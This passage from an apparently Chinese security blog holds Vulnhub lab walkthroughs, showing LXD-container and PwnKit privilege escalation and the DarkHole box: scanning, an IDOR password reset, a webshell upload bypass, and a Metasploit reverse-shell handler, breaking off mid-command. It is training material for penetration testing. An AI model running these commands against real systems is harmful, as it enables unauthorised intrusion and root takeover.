http://192.168.2.4/alpine-v3.13-x86_64-20210218_0139.tar.gz<br>--2025-02-11 07:48:07--  http://192.168.2.4/alpine-v3.13-x86_64-20210218_0139.tar.gz<br>Connecting to 192.168.2.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3259593 (3.1M) [application/gzip]<br>Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’<br><br>alpine-v3.13-x86_64-20210218_ 100%[==============================================&gt;]   3.11M  --.-KB/s    <span class="hljs-keyword">in</span> 0.02s   <br><br>2025-02-11 07:48:07 (161 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]<br></code></pre></td></tr></table></figure>（5）初始化镜像并导入镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage<br>If this is your first <span class="hljs-keyword">time</span> running LXD on this machine, you should also run: lxd init<br>To start your first instance, try: lxc launch ubuntu:18.04<br><br>Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b<br>hackable_3@ubuntu20:/tmp$ lxd init <span class="hljs-comment">#默认选项</span><br></code></pre></td></tr></table></figure>（6）初始化镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc init myimage ignite -c security.privileged=<span class="hljs-literal">true</span><br>Creating ignite<br></code></pre></td></tr></table></figure>（7）将宿主机目录挂至容器<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc config device add ignite mydevice disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>Device mydevice added to ignite<br></code></pre></td></tr></table></figure>（8）启动容器<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc start ignite<br></code></pre></td></tr></table></figure>（9）提权到<code>root</code>权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ackable_3@ubuntu20:/tmp$ lxc <span class="hljs-built_in">exec</span> ignite /bin/sh<br>~ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root)<br></code></pre></td></tr></table></figure><strong>查看flag</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ <span class="hljs-comment"># cat /mnt/root/root/root.txt </span><br>░░█▀░░░░░░░░░░░▀▀███████░░░░<br>░░█▌░░░░░░░░░░░░░░░▀██████░░░<br>░█▌░░░░░░░░░░░░░░░░███████▌░░<br>░█░░░░░░░░░░░░░░░░░████████░░<br>▐▌░░░░░░░░░░░░░░░░░▀██████▌░░<br>░▌▄███▌░░░░▀████▄░░░░▀████▌░░<br>▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░<br>▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌<br>▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌<br>▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌<br>░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░<br>░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░<br>░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░<br>░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░<br>░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░<br>░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░<br>░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░<br>░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░<br>░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░<br>▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░<br>░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄<br>░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░<br>░░▄▌████████▄▄▄███████▌░░░░░▄<br>░▄▀░██████████████████▌▀▄░░░░<br>▀░░░█████▀▀░░░▀███████░░░▀▄░░<br>░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░<br>░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀<br>░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░<br>░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░<br>░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░<br>░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░<br><br>invite-me: linkedin.com/in/eliastouguinho<br>~ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure></li></ul><h1 id="提权2-pwnkit"><a href="#提权2-pwnkit" class="headerlink" title="提权2-pwnkit"></a>提权2-pwnkit</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，找到一个pwnkit<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502121110939.png"><br>（2）根据提示，找到利用的exp，但是执行后发现缺少<code>GLIBC_2.34</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ ./exp /usr/bin/chfn<br>./exp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34<span class="hljs-string">&#x27; not found (required by ./exp)</span><br></code></pre></td></tr></table></figure><p>（3）最后寻找到一个python的exp，成功进行提权<br>python脚本：<a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:/tmp$ <span class="hljs-built_in">chmod</span> +x CVE-2021-4034.py<br>jubiscleudo@ubuntu20:/tmp$ python3 CVE-2021-4034.py<br>[+] Creating shared library <span class="hljs-keyword">for</span> exploit code.<br>[+] Calling execve()<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=1001(jubiscleudo) <span class="hljs-built_in">groups</span>=1001(jubiscleudo)<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）端口敲击<code>knock</code><br>端口敲门（Port Knocking）是一个巧妙的安全技术</p><ul><li>核心思想是：<br>  服务器的端口在默认情况下是“关着”的，只有<strong>按特定顺序访问</strong>一系列端口（即敲门），服务器才会临时打开关键端口，比如 SSH 的 22 端口。</li></ul><p>通过这种“动态开门”的方式，端口敲门让服务端口更隐秘，大幅降低了被恶意扫描和攻击的风险。</p><ul><li>端口敲门的工作流程如下：<ol><li>客户端按特定顺序访问几个指定的端口（敲门序列）。</li><li>服务端检测到正确的敲门序列后，触发规则，打开目标端口。</li><li>客户端完成访问后，可以再敲相反的顺序进行关闭端口。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ knock -h                              <br>usage: knock [options] &lt;host&gt; &lt;port[:proto]&gt; [port[:proto]] ...<br>options:<br>  -u, --udp            make all ports hits use UDP (default is TCP)<br>  -d, --delay &lt;t&gt;      <span class="hljs-built_in">wait</span> &lt;t&gt; milliseconds between port hits<br>  -4, --ipv4           Force usage of IPv4<br>  -6, --ipv6           Force usage of IPv6<br>  -v, --verbose        be verbose<br>  -V, --version        display version<br>  -h, --<span class="hljs-built_in">help</span>           this <span class="hljs-built_in">help</span><br><br>example:  knock myserver.example.com 123:tcp 456:udp 789:tcp<br></code></pre></td></tr></table></figure>（2）lxd提权<br>lxd用户组是Linux系统中一个特殊的用户组。该组的组成员均可以使用 Linux容器（LXD）。当前用户隶属于lxd用户组时，可以使用 lxc命令创建一个新的容器，再将宿主机文件系统挂载至容器中，即可进行查看宿主机敏感文件等操作。</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权-pwnkit</tag>
      
      <tag>图片隐写</tag>
      
      <tag>敲击端口</tag>
      
      <tag>提权-lxd组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DarkHole</title>
    <link href="/Vulnhub/DarkHole/"/>
    <url>/Vulnhub/DarkHole/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/darkhole-1,724">https://www.vulnhub.com/entry/darkhole-1,724</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.00053s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00052s latency).<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.00028s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.4 -oA nmapscan/ports                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.0058s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.75 seconds<br></code></pre></td></tr></table></figure><ul><li>开放端口22和80<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.1.4 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.0029s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.63 seconds<br></code></pre></td></tr></table></figure></li></ul><p>（3）进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80 192.168.1.4 -oA nmapscan/udp                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00033s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.20 seconds<br><br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.1.4 -oA nmapscan/vuln      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00049s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|       httponly flag not set</span><br><span class="hljs-string">|   /login.php: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.4</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.1.4:80/login.php</span><br><span class="hljs-string">|     Form id: login__username</span><br><span class="hljs-string">|     Form action: login.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.1.4:80/register.php</span><br><span class="hljs-string">|     Form id: login__username</span><br><span class="hljs-string">|_    Form action: </span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /login.php: Possible admin folder<br>|   /config/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|   /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|_  /upload/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.21 seconds<br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.4 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.4<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 276]<br>/.php                 (Status: 403) [Size: 276]<br>/index.php            (Status: 200) [Size: 810]<br>/login.php            (Status: 200) [Size: 2507]<br>/register.php         (Status: 200) [Size: 2886]<br>/upload               (Status: 301) [Size: 311] [--&gt; http://192.168.1.4/upload/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://192.168.1.4/css/]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://192.168.1.4/js/]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]<br>/config               (Status: 301) [Size: 311] [--&gt; http://192.168.1.4/config/]<br>/dashboard.php        (Status: 200) [Size: 21]<br>/.php                 (Status: 403) [Size: 276]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（2）访问80端口，存在一个登录页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082219936.png"></p><h2 id="web逻辑漏洞"><a href="#web逻辑漏洞" class="headerlink" title="web逻辑漏洞"></a>web逻辑漏洞</h2><p>（1）注册一个新用户，进行登录，发现可以更改用户的密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082223499.png"><br>（2）进行抓包，查看修改密码的数据包，发现有<code>id</code>标识<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082226003.png"><br>（3）尝试将<code>id</code>修改为1<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227756.png"><br>（4）尝试进行登录，成功进行登录，登录后存在一个文件上传的功能<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082227820.png"><br>（5）进行文件上传，尝试上传一个webshell，提示只允许<code>jpg,png,gif</code>上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082231600.png"><br>（6）经过尝试，最后将文件的后缀修改为<code>.phmtl</code>，即可成功进行上传<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082233843.png"><br>（7）使用哥斯拉进行连接，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082235415.png"><br>（8）由于哥斯拉里面的shell，不属于稳定的shell，所以需要反弹一个稳定的shell</p><ul><li><p>使用哥斯拉中的<code>PMeterpreter</code>进行反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082248782.png"></p></li><li><p>开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 4444<br>lport =&gt; 4444<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[*] Sending stage (39927 bytes) to 192.168.1.4<br>[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.4:37968) at 2025-02-08 22:47:24 +0800<br><br>meterpreter &gt; <br><br></code></pre></td></tr></table></figure></li></ul><h1 id="提权-pwnkit"><a href="#提权-pwnkit" class="headerlink" title="提权-pwnkit"></a>提权-pwnkit</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，将脚本上传至临时目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（2）执行脚本，查看可以用什么方式进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 10161 created.<br>Channel 1 created.<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">chmod</span> +x 1.sh<br>./1.sh<br></code></pre></td></tr></table></figure><p>（3）找到<code>cve_2021_4034</code>的漏洞利用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502082255157.png"><br>（4）使用msf，寻找漏洞利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; background<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; search cve_2021_4034<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                                 Disclosure Date  Rank       Check  Description</span><br>   -  ----                                                 ---------------  ----       -----  -----------<br>   0  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  2022-01-25       excellent  Yes    Local Privilege Escalation <span class="hljs-keyword">in</span> polkits pkexec<br>   1    \_ target: x86_64                                  .              <br>   2    \_ target: x86                                     .    <br>   3    \_ target: aarch64                                 .              <br><br>Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                                                                                           <br>After interacting with a module you can manually <span class="hljs-built_in">set</span> a TARGET with <span class="hljs-built_in">set</span> TARGET <span class="hljs-string">&#x27;aarch64&#x27;</span><br></code></pre></td></tr></table></figure><p>（5）找到一个可利用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec<br>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp<br><br>msf6 